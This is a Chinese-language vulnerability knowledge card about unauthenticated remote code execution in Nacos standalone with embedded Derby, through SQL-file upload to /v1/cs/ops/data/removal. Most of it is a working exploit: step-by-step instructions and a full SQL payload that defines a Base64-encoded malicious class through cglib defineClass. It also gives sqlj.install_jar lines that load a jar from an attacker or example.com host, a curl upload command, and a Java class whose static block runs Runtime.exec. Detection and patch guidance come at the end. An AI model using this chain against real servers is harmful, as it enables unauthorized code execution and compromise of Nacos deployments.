---
id: web-java-component-nacos-derby-removal-sqlj-install-jar-rce
title: Nacos Derby 未授权到 RCE：/v1/cs/ops/data/removal 导入 SQL，sqlj.install_jar / EXPORT_QUERY_LOBS_TO_EXTFILE / create type external 加载恶意类
type: scenario
domain: web
path: web/java/component
technique: nacos-derby-removal-import-sql-java-class-rce
aliases:
- Nacos Derby RCE
- /nacos/v1/cs/ops/data/removal
- sqlj.install_jar
- SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE
- create type external defineClass
- Nacos 2.3.2 RCE
- Nacos Derby 组合拳
tags:
- nacos
- java
- derby
- rce
- sqlj
- unauthorized-access
- component
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V297
  verified_at: '2026-11-08T08:08:05+08:00'
  notes: 已对照原文与全部35张图核对：2.3.2 standalone默认配置（图33）、removal上传payload.sql（图34）、File '.tmp' does not exist竞态与重试至code:200 success（图35）、sqlj.install_jar/EXPORT_QUERY_LOBS_TO_EXTFILE/create type external+ReflectUtils.defineClass三种方式与SQL语句均与原文一致。原文未给受影响版本区间，未设affected_versions；未给CVE，cve留空符合。未验证点：未实际复现RCE。
---

## 一句话结论

Nacos standalone 默认配置下，Derby 运维接口未授权；`/v1/cs/ops/derby` 只允许 `select` 开头，但 `/nacos/v1/cs/ops/data/removal` 是 SQL 导入/清理接口，接受任意语句的 SQL 文件。攻击者上传包含 `sqlj.install_jar`（远程 jar）、`SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE`（本地写文件）或 `create type ... external name 'java.lang.Class'` + `ReflectUtils.defineClass`（内存定义类）的 SQL，即可在 Nacos JVM 中加载/执行恶意类，实现 RCE；原文在 2.3.2 standalone 默认配置验证了第三种不出网方式。

## 原理

- `derby` 查询接口仅允许 `select` 前缀，单靠查询无法执行代码；但 `/v1/cs/ops/data/removal`（`/nacos/v1/cs/ops/data/removal`）用于导入/清理 SQL 数据，接收 multipart 上传的 SQL 文件并执行其中语句，不套用 select 前缀限制，且默认配置下同样未鉴权。
- Derby 提供 Java 存储过程/自定义类型能力，可从 SQL 触发 Java 类加载：
  - **方式一（需出网）**：`CALL sqlj.install_jar('http://attacker/malicious.jar', 'APP.malicious_jar', 0)` 把远程 jar 安装进数据库，再创建/调用其静态方法；数据库服务器必须能访问攻击者 HTTP。
  - **方式二（先落盘）**：`CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('SELECT ...', '/path/file.jar', ',')` 把查询结果（BLOB/CLOB）写到本地文件，再 `CALL sqlj.install_jar('file:///path/file.jar', 'APP.local_jar', 0)` 加载。
  - **方式三（不出网，原文重点）**：用 `create type typeClass external name 'java.lang.Class' language java`、`create type typeClassLoader external name 'java.lang.ClassLoader' language java` 映射 JDK 类；用 `create function base64Decode(...) external name 'org.springframework.util.Base64Utils.decodeFromString'`、`getSystemClassLoader() external name 'java.lang.ClassLoader.getSystemClassLoader'`、`defineClass(...) external name 'org.springframework.cglib.core.ReflectUtils.defineClass(java.lang.String, byte[], java.lang.ClassLoader)'` 把 Base64 的恶意 `.class` 字节定义成类；`insert into test values (defineClass(...))` 触发类初始化（`static {}` 块执行 `Runtime.getRuntime().exec(...)`）。
- 为什么方式三能不出网：它只用目标 classpath 已有的 Spring `Base64Utils` 与 cglib `ReflectUtils.defineClass`，恶意类字节随 SQL 上传，不经远程加载；`static` 初始化块在 `defineClass`/实例化时执行。
- 原文的复现会出现 `"File 'C:\\Users\\...\\Temp\\fileXXXX.tmp' does not exist"`——上传临时文件被删除/竞态导致，属正常失败；脚本循环重试直到 `"code":200,"message":"success"`。
- 边界：需要 standalone/嵌入式 Derby 且 `/data/removal` 未鉴权；集群/外部数据库不适用；方式一/二要求网络或可写路径，方式三依赖 Spring/cglib 及可执行 `defineClass` 的权限；补丁/开启鉴权后失效。

## 触发条件

- Nacos 以 standalone + 默认嵌入式 Derby 启动，且未开启鉴权（原文 2.3.2 默认配置）。
- `/nacos/v1/cs/ops/data/removal` 可从攻击者网络访问。
- 目标 classpath 具备 Spring `Base64Utils`、cglib `ReflectUtils`（方式三）；或数据库可出网/可写本地文件（方式一/二）。
- 攻击者能上传 multipart SQL 文件；仅用于授权测试。

## 利用步骤

1. 先验证未授权 Derby 接口：`GET /nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20` 返回数据。
2. 准备恶意类（`static { Runtime.getRuntime().exec("calc"); }`），`javac` 编译后 Base64 编码；或打包恶意 jar（方式一/二）。
3. 编写 SQL 文件：
   - 方式一：`CALL sqlj.install_jar('http://attacker/malicious.jar','APP.malicious_jar',0)`；
   - 方式二：`CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE(...)` 写文件后 `CALL sqlj.install_jar('file:///...',...)`；
   - 方式三：按原文 SQL 创建 type/function 并用 `defineClass` 定义 Base64 类，`insert` 触发。
4. 上传：`curl -X POST -F "file=@./payload.sql" "http://target:8848/nacos/v1/cs/ops/data/removal"`。
5. 若返回 `File ... does not exist`，编写脚本每隔数秒重试，直到 `{"code":200,"message":"success","data":null}`；这是上传临时文件竞态。
6. 观察命令执行（如 `calc`/DNS/反弹 shell）；记录证据。

## PoC

原文方式三的 SQL 骨架（恶意类 Base64 以占位符表示）：

```sql
create type typeClass external name 'java.lang.Class' language java;
create type typeClassLoader external name 'java.lang.ClassLoader' language java;
create function base64Decode(className VARCHAR(32672)) RETURNS VARCHAR(32672) FOR BIT DATA
  external name 'org.springframework.util.Base64Utils.decodeFromString' language java parameter style java;
create function getSystemClassLoader() returns typeClassLoader
  external name 'java.lang.ClassLoader.getSystemClassLoader' language java parameter style java;
create function defineClass(className VARCHAR(32672), bytes VARCHAR(32672) FOR BIT DATA, loader typeClassLoader)
  returns typeClass
  external name 'org.springframework.cglib.core.ReflectUtils.defineClass(java.lang.String, byte[], java.lang.ClassLoader)'
  language java parameter style java;
create table test(v typeClass);
insert into test values (defineClass('MaliciousClass', base64Decode('<malicious.class 的 Base64>'), getSystemClassLoader()));
```

```bash
curl -X POST -F "file=@./payload.sql" "http://192.168.111.130:8848/nacos/v1/cs/ops/data/removal"
```

成功回显：

```json
{"code":200,"message":"success","data":null}
```

失败回显示例（竞态，需重试）：

```json
{"code":500,"message":"File 'C:\\Users\\...\\AppData\\Local\\Temp\\fileXXXX.tmp' does not exist","data":null}
```

方式一/二语句：

```sql
CALL sqlj.install_jar('http://example.com/malicious.jar', 'APP.malicious_jar', 0);

CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('SELECT my_blob_column FROM my_table', 'my_exported_file.jar', '<delimiter>');
CALL sqlj.install_jar('file:///path/to/my_exported_file.jar', 'APP.local_jar', 0);
```

恶意类示例：

```java
public class MaliciousClass {
    static {
        try { Runtime.getRuntime().exec("calc"); } catch (Exception e) {}
    }
}
```

## 变体与关联

- **Derby 未授权 SQL 读取**：同一接口家族的前置弱点，见 [[web-java-component-nacos-derby-ops-unauth-sqli-user-dump]]（CVE-2021-29442）。
- **已知限制**：`/derby` 只允许 select 前缀，不能直接执行上述语句；必须走 `/data/removal` 导入或其它可执行 SQL 的入口。
- **不出网技巧泛化**：`create type/function external name` 映射 JDK/框架类 + `defineClass` 是 Derby 在无网络时的通用 Java 类加载原语；类似 H2/HSQLDB 的 `CREATE ALIAS`/`Runtime.exec` 也属数据库到 JVM 的逃逸（见相关 H2/HSQLDB 卡）。
- **默认配置链**：若鉴权关闭，还可直接用户 API 建号/读配置，见 [[web-java-component-nacos-default-auth-disabled-user-admin]]。
- 关联：[[web-java-component-h2-jre-only-create-alias-static-method-rce]]、[[web-java-component-hsqldb-call-static-method-rce]]（数据库函数映射到 Java 静态方法的同类思路）。

## 检测与防御

- **检测**：`/nacos/v1/cs/ops/data/removal` 的 multipart 上传；SQL 中出现 `sqlj.install_jar`、`SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE`、`create type ... external name`、`defineClass`；Nacos 进程启动 `calc`/`cmd`/`sh` 或异常外联。
- **防御**：升级到修复版本并开启鉴权（`nacos.core.auth.enabled=true`）且修改默认密钥；该接口应仅管理员可用，生产禁止公网暴露 8848；使用外部数据库/集群模式时仍需鉴权与网络隔离；监控 Derby 存储过程的异常调用。
- **补丁复核**：检查 `/v1/cs/ops/data/removal` 是否有 `@Secured` 或等价管理员校验；仅在 `/derby` 加 select 限制不足以阻断本链。
